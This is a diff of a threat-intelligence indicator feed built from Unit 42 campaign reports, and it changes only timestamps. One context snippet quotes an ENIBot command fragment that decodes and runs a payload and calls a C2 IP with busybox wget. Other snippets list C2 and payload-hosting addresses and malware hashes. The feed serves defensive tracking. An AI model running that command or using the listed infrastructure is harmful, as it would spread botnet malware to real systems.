@@ -4466,7 +4466,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "d_scripts |busybox base64 -d>/tmp/sshd;busybox sh /tmp/sshd 216.167.26.154 1337 enibot2024\r\n- busybox wget -q http://216"
     },
     {
@@ -4475,7 +4475,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "5d5272587405611fd3de7b0d\r\n\r\nC2 IP:\r\n- July\r\n216.167.26.154\r\n192.204.41.160\r\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n"
     },
     {
@@ -4484,7 +4484,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "\r\n\r\nC2 IP:\r\n- July\r\n216.167.26.154\r\n192.204.41.160\r\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.13"
     },
     {
@@ -4493,7 +4493,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "192.204.41.160\r\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP ("
     },
     {
@@ -4502,7 +4502,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52."
     },
     {
@@ -4511,7 +4511,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": ".139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20"
     },
     {
@@ -4520,7 +4520,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "1\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20.169.94.182\r\n172.183.94.160\r\n135.232.224.1"
     },
     {
@@ -4529,7 +4529,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20.169.94.182\r\n172.183.94.160\r\n135.232.224.163\r\n135.119.132."
     },
     {
@@ -4538,7 +4538,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-22T01:13:31.373623+00:00",
+      "article_date": "2026-08-22T02:55:26.380560+00:00",
       "context": "\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20.169.94.182\r\n172.183.94.160\r\n135.232.224.163\r\n135.119.132.147\r\n40.76.181."
     },
     {
@@ -4547,7 +4547,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-22T01:13:32.617083+00:00",
+      "article_date": "2026-08-22T02:55:27.676771+00:00",
       "context": "\n\r\n\r\nSHA256 HASHES FOR FIREFOXUPDATE.DLL (9 VARIANTS):\r\n\r\n- 1da7efbbdf7c49193f00716c23ffc6aa7bf95cf7a0592d043b87273deed4"
     },
     {
@@ -4556,7 +4556,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-22T01:13:32.617083+00:00",
+      "article_date": "2026-08-22T02:55:27.676771+00:00",
       "context": "90255ff4fcd40253b49b6a3f1f327728bb8c98b8a040ecbef5118a5e\r\n- f9d378f5e6a0dbca15ae355190f58f66f2e33024a5216f9f0cc065f8c68a"
     },
     {
@@ -4565,7 +4565,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-22T01:13:32.617083+00:00",
+      "article_date": "2026-08-22T02:55:27.676771+00:00",
       "context": "8a3cd0\r\n\r\nSHA256 HASHES FOR MOZGLUE.DLL (54 VARIANTS):\r\n\r\n- 0234f3afddedb16450e7f9c51ec55a3c935ce568806a7c1888aae048d44a"
     },
     {
@@ -4574,7 +4574,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-22T01:13:32.617083+00:00",
+      "article_date": "2026-08-22T02:55:27.676771+00:00",
       "context": "a1afd6b803ab40c29308056d2cb70da3e15bbb7312bc1d9cfd6f33a0\r\n- fc15406249efda3972416625cebab46be623e6eb9c144f2a1ac13535cc2e"
     },
     {
@@ -4583,7 +4583,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-22T01:13:32.617083+00:00",
+      "article_date": "2026-08-22T02:55:27.676771+00:00",
       "context": "35cc2ee974\r\n\r\nSHA256 HASHES FOR XUL.DLL (56 VARIANTS):\r\n\r\n- 056a5cdabf72199382313b0966490d18b7d002ab1638c194a1325d9aaf7c"
     },
     {
@@ -4592,7 +4592,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
-      "article_date": "2026-08-22T01:13:33.243071+00:00",
+      "article_date": "2026-08-22T02:55:28.324474+00:00",
       "context": " document containing the malicious payload:         \r\n    - 6d585d11236277c42bf3666192f89733b1d5595967f6434a2e1b6c9d8584"
     },
     {
@@ -4601,7 +4601,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
-      "article_date": "2026-08-22T01:13:33.243071+00:00",
+      "article_date": "2026-08-22T02:55:28.324474+00:00",
       "context": "a2e1b6c9d8584a22c\r\n- SHA256 of the malicious payload\r\n    - f591ececf07aedf2f60dc9a362033b6f718799d5909ab38b6941a5296555"
     },
     {
@@ -4610,7 +4610,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
-      "article_date": "2026-08-22T01:13:33.243071+00:00",
+      "article_date": "2026-08-22T02:55:28.324474+00:00",
       "context": " payload)\r\n    - https://31.97.137.157:45000\r\n    - https://46.183.25.232:45000\r\n    - https://bet.slotgambit.com\r\n- URL"
     },
     {
@@ -4619,7 +4619,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-22T01:13:33.867430+00:00",
+      "article_date": "2026-08-22T02:55:28.939011+00:00",
       "context": "\n2 RELATED SAMPLES (READ SHA256 HASH - FIRST SEEN DATE):\r\n\r\n55a1eb4c2d3da04376df39d7ba832569c6af1a37a0cf2b95f754ac898023"
     },
     {
@@ -4628,7 +4628,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-22T01:13:33.867430+00:00",
+      "article_date": "2026-08-22T02:55:28.939011+00:00",
       "context": "HURSDAY): Hazy Scorpius Exploitation of CVE-2026-12569\r\n\r\nAUTHOR:\r\n\r\n- Matt Brady\r\n\r\nREFERENCE"
     },
     {
@@ -4637,7 +4637,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-22T01:13:33.867430+00:00",
+      "article_date": "2026-08-22T02:55:28.939011+00:00",
       "context": "aloaltonetworks.com/threat-brief-moveit-cve-2023-34362/\r\n  -- https://www.cybereason.com/blog/"
     },
     {
@@ -4646,7 +4646,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-22T01:13:33.867430+00:00",
+      "article_date": "2026-08-22T02:55:28.939011+00:00",
       "context": "/\r\n  -- https://www.cybereason.com/blog/cve-2024-55956-cleo-vulnerability\r\n- However, the grou"
     },
     {
@@ -4655,7 +4655,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-22T01:13:33.867430+00:00",
+      "article_date": "2026-08-22T02:55:28.939011+00:00",
       "context": "of its exploitation of a vulnerability (CVE-2025-61884) in Oracle’s E-Business Suite (EBS) sof"
     }
   ],
